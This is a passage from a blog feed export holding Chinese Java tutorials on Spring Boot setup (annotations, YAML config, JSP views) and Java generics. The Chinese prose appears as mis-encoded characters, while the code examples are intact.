--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>æœ‰äº†è¿™ä¸ªï¼Œå½“å‰çš„é¡¹ç›®æ‰æ˜¯ Spring Boot é¡¹ç›®ï¼Œspring-boot-starter-parent æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ starter ï¼Œå®ƒç”¨æ¥æä¾›ç›¸å…³çš„Mavené»˜è®¤ä¾èµ–ã€‚<strong>ä½¿ç”¨å®ƒä¹‹åï¼Œå¸¸ç”¨çš„åŒ…ä¾èµ–å°±å¯ä»¥çœå» version æ ‡ç­¾ï¼Œå…³äºå…·ä½“ Spring Boot æä¾›äº†å“ªäº› jar åŒ…çš„ä¾èµ–ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æœ¬åœ° Maven ä»“åº“ä¸‹ï¼š\repository\org\springframework\boot\spring-boot-dependencies\2.2.2.RELEASE\spring-boot-dependencies-2.2.2.RELEASE.pom æ–‡ä»¶æ¥æŸ¥çœ‹</strong></p></blockquote><p>æ¯”å¦‚è¯´spring bootå†…ç½®äº†Tomcatä½œä¸ºé»˜è®¤çš„Servletå®¹å™¨ï¼Œ2.2.2ç‰ˆæœ¬å¯¹åº”çš„Tomcatç‰ˆæœ¬ä¸º9.0.29ã€‚</p><blockquote><p><img src="/../images/image-20230930202303209.png" alt="image-20230930202303209"></p></blockquote></li><li><p><strong>é¡¹ç›®é…ç½®æ–‡ä»¶</strong>åœ¨<code>src/main/resources</code>ç›®å½•ä¸‹</p><p><code>application.properties</code>æˆ–è€…<code>application.yml</code></p><p><img src="/../images/2019123117071828.png" alt="img"></p></li><li><p><strong>åº”ç”¨å…¥å£ç±»</strong></p><blockquote><p>Spring Boot é¡¹ç›®é€šå¸¸æœ‰ä¸€ä¸ªåä¸º *Application çš„å…¥å£ç±»ï¼Œå…¥å£ç±»é‡Œæœ‰ä¸€ä¸ª main æ–¹æ³•ï¼Œ <strong>è¿™ä¸ª main æ–¹æ³•å…¶å®å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Java åº”ç”¨çš„å…¥å£æ–¹æ³•ã€‚</strong></p></blockquote></li></ul><h2 id="è¯·æ±‚ä¼ é€’æµç¨‹"><a href="#è¯·æ±‚ä¼ é€’æµç¨‹" class="headerlink" title="è¯·æ±‚ä¼ é€’æµç¨‹"></a>è¯·æ±‚ä¼ é€’æµç¨‹</h2><p><img src="/../images/request-path.png" alt="request-path"></p><p>ä¸ºäº†æ›´å¥½ç†è§£ï¼Œä»¥ã€Œä¿å­˜è®¢å•ã€åŠŸèƒ½ä¸ºä¾‹ï¼Œä¸»è¦çš„è¯·æ±‚æµç¨‹å¦‚ä¸‹å›¾ï¼Œä¸äº†è§£Springè¯·æ±‚ä¼ é€’çš„åŒå­¦å¯ä»¥åœ¨ä»£ç ä¸­è·Ÿä¸€éè¯·æ±‚æµç¨‹ï¼Œä¼šåŠ æ·±è¯·æ±‚ä¼ é€’çš„å°è±¡ã€‚</p><p><img src="/../images/request-example.png" alt="request-example"></p><h2 id="æ³¨è§£"><a href="#æ³¨è§£" class="headerlink" title="æ³¨è§£"></a>æ³¨è§£</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication: ç”¨äºæ ‡è¯†ä¸»ç±»ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª Spring Boot åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚å®ƒç»„åˆäº† @Configurationã€@EnableAutoConfiguration å’Œ @ComponentScan æ³¨è§£ã€‚</span><br><span class="line"></span><br><span class="line">@RestController: æ ‡è¯†ä¸€ä¸ªç±»ä¸º RESTful é£æ ¼çš„æ§åˆ¶å™¨ï¼Œç”¨äºå¤„ç† HTTP è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚</span><br><span class="line"></span><br><span class="line">@RequestMapping: å®šä¹‰è¯·æ±‚çš„ URL è·¯å¾„ï¼Œå¯ç”¨äºç±»çº§åˆ«æˆ–æ–¹æ³•çº§åˆ«ã€‚ç”¨äºæ˜ å°„ HTTP è¯·æ±‚åˆ°ç›¸åº”çš„æ§åˆ¶å™¨æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">@GetMapping, @PostMapping, @PutMapping, @DeleteMapping: åˆ†åˆ«ç”¨äºæ ‡è¯† GETã€POSTã€PUT å’Œ DELETE è¯·æ±‚çš„å¤„ç†æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">@RequestBody: ç”¨äºå°†è¯·æ±‚ä½“çš„å†…å®¹ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šï¼Œé€šå¸¸ç”¨äºæ¥æ”¶ JSON æˆ– XML æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">@PathVariable: ç”¨äºä» URL è·¯å¾„ä¸­è·å–å˜é‡å€¼ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">@RequestParam: ç”¨äºè·å–è¯·æ±‚å‚æ•°çš„å€¼ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°æ–¹æ³•å‚æ•°ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">@Autowired: è‡ªåŠ¨è£…é…ä¾èµ–é¡¹ï¼Œé€šè¿‡ç±»å‹æ¥æŸ¥æ‰¾åŒ¹é…çš„ beanï¼Œå¹¶æ³¨å…¥åˆ°å­—æ®µã€æ„é€ å‡½æ•°æˆ–æ–¹æ³•å‚æ•°ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">@Value: ç”¨äºå°†å±æ€§å€¼æ³¨å…¥åˆ°å­—æ®µã€æ„é€ å‡½æ•°æˆ–æ–¹æ³•å‚æ•°ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">@Configuration: å£°æ˜ä¸€ä¸ªç±»ä½œä¸ºé…ç½®ç±»ï¼Œç”¨äºå®šä¹‰ bean çš„åˆ›å»ºå’Œé…ç½®ã€‚</span><br><span class="line"></span><br><span class="line">@Component: æ ‡è¯†ä¸€ä¸ªç±»ä¸º Spring ç»„ä»¶ï¼Œä¼šè¢«è‡ªåŠ¨æ‰«æå¹¶åˆ›å»ºä¸º beanã€‚</span><br><span class="line"></span><br><span class="line">@Service: æ ‡è¯†ä¸€ä¸ªç±»ä¸ºæœåŠ¡å±‚ç»„ä»¶ï¼Œé€šå¸¸ç”¨äºæ³¨è§£ä¸šåŠ¡é€»è¾‘çš„å®ç°ç±»ã€‚</span><br><span class="line"></span><br><span class="line">@Repository: æ ‡è¯†ä¸€ä¸ªç±»ä¸ºæ•°æ®è®¿é—®å±‚ç»„ä»¶ï¼Œé€šå¸¸ç”¨äºæ³¨è§£æ•°æ®åº“æ“ä½œçš„å®ç°ç±»ã€‚</span><br><span class="line"></span><br><span class="line">@EnableAutoConfiguration: å¼€å¯è‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼ŒSpring Boot ä¼šæ ¹æ®é¡¹ç›®çš„ä¾èµ–å’Œé…ç½®è‡ªåŠ¨è¿›è¡Œç›¸åº”çš„é…ç½®ã€‚</span><br><span class="line"></span><br><span class="line">@Conditional: æ ¹æ®æ¡ä»¶æ¥å†³å®šæ˜¯å¦åˆ›å»ºæŸä¸ª bean æˆ–æ‰§è¡ŒæŸæ®µä»£ç ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨<code>application.yml</code>ä¸­æ·»åŠ </p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">Khaz</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="attr">content:</span> <span class="string">&quot;name$&#123;name&#125;,age$&#123;age&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>æ–°å»º<code>HelloController</code>ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">&quot;:&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@RestController</code>æ‰€ä»¥æ•°æ®æ ¼å¼ä¸ºjsonæ ¼å¼</p><p><img src="/../images/image-20230925113401628.png" alt="image-20230925113401628"></p><h2 id="è¿è¡Œjsp"><a href="#è¿è¡Œjsp" class="headerlink" title="è¿è¡Œjsp"></a>è¿è¡Œjsp</h2><p><strong>ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--jsp--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--servlet--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--jstl--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¸»æµçš„ç›®å½•ç»“æ„</strong></p><blockquote><p>éå¿…é¡»ï¼Œé…ç½®å¥½è§†å›¾è·¯å¾„å‰ç¼€å³å¯</p></blockquote><p><img src="/../images/image-20230925115020412.png" alt="image-20230925115020412"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€WEBAPP</span><br><span class="line">    â””â”€WEB-INF</span><br><span class="line">        â””â”€jsp</span><br><span class="line">            â””â”€index.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925115955133.png" alt="image-20230925115955133"></p><p><strong>é…ç½®è§†å›¾</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">view:</span></span><br><span class="line">      <span class="attr">prefix:</span> <span class="string">/WEB-INF/jsp/</span></span><br><span class="line">      <span class="attr">suffix:</span> <span class="string">.jsp</span></span><br></pre></td></tr></table></figure><blockquote><p>prefixéœ€è¦åŠ ä¸Š&#x2F;ï¼Œè·¯å¾„çš„æ‹¼æ¥ä¸ºå‰ç¼€+è§†å›¾åç§°+åç¼€ï¼š&#x2F;WEB-INF&#x2F;jsp&#x2F;index.jsp</p></blockquote><p><strong>æ§åˆ¶ç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;web&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;index&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>@Controller</code>æ³¨è§£å°†<code>WebController</code>ç±»å£°æ˜ä¸ºSpring MVCçš„æ§åˆ¶å™¨ã€‚</li><li>ä½¿ç”¨<code>@RequestMapping(&quot;web&quot;)</code>æ³¨è§£å°†<code>web</code>ä½œä¸ºåŸºæœ¬URLè·¯å¾„ï¼Œè¡¨ç¤ºè¯¥æ§åˆ¶å™¨å¤„ç†ä»¥<code>/web</code>å¼€å¤´çš„è¯·æ±‚ã€‚</li><li>åœ¨<code>index</code>æ–¹æ³•ä¸Šä½¿ç”¨<code>@RequestMapping(value = &quot;index&quot;, method = RequestMethod.GET)</code>æ³¨è§£æ¥æ˜ å°„å…·ä½“çš„è¯·æ±‚è·¯å¾„ï¼Œå³å¤„ç†ä»¥<code>/web/index</code>çš„GETè¯·æ±‚ã€‚</li><li>æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² <code>&quot;index&quot;</code>ï¼Œè¡¨ç¤ºè¦æ¸²æŸ“åä¸º<code>index</code>çš„è§†å›¾ã€‚</li></ul><p><strong>è¿è¡Œç»“æœ</strong></p><p><img src="/../images/image-20230925120058229.png" alt="image-20230925120058229"></p><h1 id="SpringCloud-äº†è§£å³å¯"><a href="#SpringCloud-äº†è§£å³å¯" class="headerlink" title="SpringCloud (äº†è§£å³å¯)"></a>SpringCloud (äº†è§£å³å¯)</h1><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.csdn.net/hezhimin1124/article/details/103782745">é€šè¿‡IDEAæ­å»ºspringbooté¡¹ç›®ï¼ˆmavenæ–¹å¼ï¼‰_ideaåˆ›å»ºspringboot +maven_æ™ºMinçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html">https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaæ³›å‹</title>
      <link href="/2023/05/01/Java%E6%B3%9B%E5%9E%8B/"/>
      <url>/2023/05/01/Java%E6%B3%9B%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ³›å‹"><a href="#æ³›å‹" class="headerlink" title="æ³›å‹"></a>æ³›å‹</h1><p><a href="https://www.cnblogs.com/coprince/p/8603492.html">java æ³›å‹è¯¦è§£-ç»å¯¹æ˜¯å¯¹æ³›å‹æ–¹æ³•è®²è§£æœ€è¯¦ç»†çš„ï¼Œæ²¡æœ‰ä¹‹ä¸€ - little fat - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; stringList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">// ä½¿ç”¨æ³›å‹ç±»Listï¼Œå¹¶ä¼ å…¥Stringç±»å‹å®å‚</span></span><br><span class="line">stringList.add(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">stringList.add(<span class="string">&quot;World&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">firstElement</span> <span class="operator">=</span> stringList.get(<span class="number">0</span>); <span class="comment">// è·å–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br></pre></td></tr></table></figure><blockquote><p>å®šä¹‰ä¸€ä¸ªæ³›å‹ç±»<code>List&lt;T&gt;</code>ï¼Œå…¶ä¸­<code>T</code>ä¸ºç±»å‹å½¢å‚ï¼Œè¡¨ç¤ºåˆ—è¡¨ä¸­å…ƒç´ çš„ç±»å‹ã€‚åœ¨ä½¿ç”¨è¯¥æ³›å‹ç±»æ—¶ï¼Œéœ€è¦ä¼ å…¥å…·ä½“çš„ç±»å‹å®å‚ä½œä¸ºç±»å‹å½¢å‚çš„å–å€¼ã€‚</p></blockquote><ul><li><p><strong>ç±»å‹å½¢å‚</strong>æŒ‡çš„æ˜¯åœ¨å®šä¹‰æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•æ—¶ä½¿ç”¨çš„å ä½ç¬¦ç±»å‹ã€‚å®ƒä»¬ç”¨äºå‚æ•°åˆ—è¡¨ã€è¿”å›å€¼ç±»å‹ã€å±€éƒ¨å˜é‡ç­‰ä½ç½®ï¼Œç”¨æ¥è¡¨ç¤ºå…·ä½“çš„æ•°æ®ç±»å‹è¿˜æœªç¡®å®šã€‚é€šå¸¸ä½¿ç”¨å¤§å†™å­—æ¯æ¥è¡¨ç¤ºç±»å‹å½¢å‚ï¼Œä¾‹å¦‚<code>T</code>ã€<code>E</code>ã€<code>K</code>ç­‰ã€‚</p></li><li><p><strong>ç±»å‹å®å‚</strong>æŒ‡çš„æ˜¯åœ¨ä½¿ç”¨æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•æ—¶å®é™…ä¼ å…¥çš„å…·ä½“æ•°æ®ç±»å‹ã€‚å®ƒä»¬ç”¨äºæ›¿æ¢ç±»å‹å½¢å‚ï¼Œä½¿æ³›å‹ç±»ã€æ¥å£æˆ–æ–¹æ³•å…·ä½“åŒ–ã€‚</p><p><img src="/../images/java.lang.png?lastModify=1695619823" alt="img"></p></li></ul><h2 id="æ³›å‹çš„ä½œç”¨"><a href="#æ³›å‹çš„ä½œç”¨" class="headerlink" title="æ³›å‹çš„ä½œç”¨"></a>æ³›å‹çš„ä½œç”¨</h2><p><strong>ä»£ç å¤ç”¨</strong></p><p><img src="/../images/image-20230925132013782.png" alt="image-20230925132013782"></p><p><strong>ç±»å‹å®‰å…¨ï¼Œç¼–è¯‘å™¨ä¼šæ£€æŸ¥ç±»å‹</strong></p><p><img src="/../images/image-20230925130137491.png" alt="image-20230925130137491"></p><p>å¼•å…¥æ³›å‹åï¼Œå®ƒå°†æä¾›ç±»å‹çš„çº¦æŸï¼Œæä¾›ç¼–è¯‘å‰çš„æ£€æŸ¥ï¼š</p><p><img src="/../images/image-20230925130207681.png" alt="image-20230925130207681"></p><h2 id="æ³›å‹ç±»"><a href="#æ³›å‹ç±»" class="headerlink" title="æ³›å‹ç±»"></a>æ³›å‹ç±»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ­¤å¤„Tå¯ä»¥éšä¾¿å†™ä¸ºä»»æ„æ ‡è¯†ï¼Œå¸¸è§çš„å¦‚&lt;T&gt; Type &lt;E&gt; Element &lt;K&gt; Key &lt;V&gt; value</span></span><br><span class="line"><span class="comment">//åœ¨å®ä¾‹åŒ–æ³›å‹ç±»æ—¶ï¼Œå¿…é¡»æŒ‡å®šTçš„å…·ä½“ç±»å‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="comment">//keyè¿™ä¸ªæˆå‘˜å˜é‡çš„ç±»å‹ä¸ºT,Tçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š</span></span><br><span class="line">    <span class="keyword">private</span> T key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123; <span class="comment">//æ³›å‹æ„é€ æ–¹æ³•å½¢å‚keyçš„ç±»å‹ä¹Ÿä¸ºTï¼ŒTçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š</span></span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getKey</span><span class="params">()</span>&#123; <span class="comment">//æ³›å‹æ–¹æ³•getKeyçš„è¿”å›å€¼ç±»å‹ä¸ºTï¼ŒTçš„ç±»å‹ç”±å¤–éƒ¨æŒ‡å®š</span></span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æ³›å‹çš„ç±»å‹å‚æ•°åªèƒ½æ˜¯ç±»ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»ï¼‰ï¼Œä¸èƒ½æ˜¯ç®€å•ç±»å‹</span></span><br><span class="line"><span class="comment">//ä¼ å…¥çš„å®å‚ç±»å‹éœ€ä¸æ³›å‹çš„ç±»å‹å‚æ•°ç±»å‹ç›¸åŒï¼Œå³ä¸ºInteger.</span></span><br><span class="line">        Generic&lt;Integer&gt; genericInteger = <span class="keyword">new</span> <span class="title class_">Generic</span>&lt;Integer&gt;(<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¼ å…¥çš„å®å‚ç±»å‹éœ€ä¸æ³›å‹çš„ç±»å‹å‚æ•°ç±»å‹ç›¸åŒï¼Œå³ä¸ºString.</span></span><br><span class="line">        Generic&lt;String&gt; genericString = <span class="keyword">new</span> <span class="title class_">Generic</span>&lt;String&gt;(<span class="string">&quot;key_vlaue&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;æ³›å‹æµ‹è¯• key is &quot;</span> + genericInteger.getKey());</span><br><span class="line">        System.out.println(<span class="string">&quot;æ³›å‹æµ‹è¯• key is &quot;</span> + genericString.getKey());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925131006945.png" alt="image-20230925131006945"></p><h2 id="æ³›å‹æ¥å£"><a href="#æ³›å‹æ¥å£" class="headerlink" title="æ³›å‹æ¥å£"></a>æ³›å‹æ¥å£</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªæ³›å‹æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Generator</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">next</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¼ å…¥æ³›å‹å®å‚æ—¶ï¼š</span></span><br><span class="line"><span class="comment"> * å®šä¹‰ä¸€ä¸ªç”Ÿäº§å™¨å®ç°è¿™ä¸ªæ¥å£,è™½ç„¶æˆ‘ä»¬åªåˆ›å»ºäº†ä¸€ä¸ªæ³›å‹æ¥å£Generator&lt;T&gt;</span></span><br><span class="line"><span class="comment"> * ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¸ºTä¼ å…¥æ— æ•°ä¸ªå®å‚ï¼Œå½¢æˆæ— æ•°ç§ç±»å‹çš„Generatoræ¥å£ã€‚</span></span><br><span class="line"><span class="comment"> * åœ¨å®ç°ç±»å®ç°æ³›å‹æ¥å£æ—¶ï¼Œå¦‚å·²å°†æ³›å‹ç±»å‹ä¼ å…¥å®å‚ç±»å‹ï¼Œåˆ™æ‰€æœ‰ä½¿ç”¨æ³›å‹çš„åœ°æ–¹éƒ½è¦æ›¿æ¢æˆä¼ å…¥çš„å®å‚ç±»å‹</span></span><br><span class="line"><span class="comment"> * å³ï¼šGenerator&lt;T&gt;ï¼Œpublic T next();ä¸­çš„çš„Téƒ½è¦æ›¿æ¢æˆä¼ å…¥çš„Stringç±»å‹ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitGenerator</span> <span class="keyword">implements</span> <span class="title class_">Generator</span>&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String[] fruits = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Pear&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">return</span> fruits[rand.nextInt(<span class="number">3</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ³›å‹é€šé…ç¬¦"><a href="#æ³›å‹é€šé…ç¬¦" class="headerlink" title="æ³›å‹é€šé…ç¬¦"></a>æ³›å‹é€šé…ç¬¦</h2><p><code>Ingeter</code>æ˜¯<code>Number</code>çš„ä¸€ä¸ªå­ç±»ï¼Œä½†æ˜¯<code>Generic&lt;Integer&gt;</code>ä¸èƒ½è¢«çœ‹ä½œä¸º<code>Generic&lt;Number&gt;</code>çš„å­ç±»ã€‚</p><p><img src="/../images/image-20230925134703767.png" alt="image-20230925134703767"></p><p>ç”±æ­¤å¯ä»¥çœ‹å‡º:åŒä¸€ç§æ³›å‹å¯ä»¥å¯¹åº”å¤šä¸ªç‰ˆæœ¬ï¼ˆå› ä¸ºå‚æ•°ç±»å‹æ˜¯ä¸ç¡®å®šçš„ï¼‰ï¼Œä¸åŒç‰ˆæœ¬çš„æ³›å‹ç±»å®ä¾‹æ˜¯ä¸å…¼å®¹çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ¨é€»è¾‘ä¸Šå¯ä»¥è¡¨ç¤ºåŒæ—¶æ˜¯<code>Generic&lt;Integer&gt;</code>å’Œ<code>Generic&lt;Number&gt;</code>çˆ¶ç±»çš„å¼•ç”¨ç±»å‹ã€‚ç”±æ­¤ç±»å‹é€šé…ç¬¦<code>?</code>åº”è¿è€Œç”Ÿã€‚</p><p><img src="/../images/image-20230925134758827.png" alt="image-20230925134758827"></p><p><strong>ç±»å‹é€šé…ç¬¦ä¸€èˆ¬æ˜¯ä½¿ç”¨ï¼Ÿä»£æ›¿å…·ä½“çš„ç±»å‹å®å‚ï¼Œæ­¤å¤„çš„ï¼Ÿå’ŒNumberã€Stringã€Integerä¸€æ ·éƒ½æ˜¯ä¸€ç§å®é™…çš„ç±»å‹ï¼Œå¯ä»¥æŠŠï¼Ÿçœ‹æˆæ‰€æœ‰ç±»å‹çš„çˆ¶ç±»ã€‚æ˜¯ä¸€ç§çœŸå®çš„ç±»å‹ã€‚</strong></p><h2 id="æ³›å‹æ–¹æ³•"><a href="#æ³›å‹æ–¹æ³•" class="headerlink" title="æ³›å‹æ–¹æ³•"></a>æ³›å‹æ–¹æ³•</h2><p><strong>æ³›å‹ç±»ä¸­çš„ä½¿ç”¨äº†æ³›å‹çš„æˆå‘˜æ–¹æ³•å¹¶ä¸æ˜¯æ³›å‹æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ³›å‹ç±»çš„æ„é€ æ–¹æ³•å½¢å‚keyçš„ç±»å‹ä¹Ÿä¸ºTï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯æ³›å‹æ–¹æ³•ï¼Œåªæ˜¯ç±»ä¸­ä¸€ä¸ªæ™®é€šçš„æˆå‘˜æ–¹æ³•ã€‚å› ä¸ºè¯¥æ–¹æ³•èƒ½ä½¿ç”¨Tæ˜¯å› 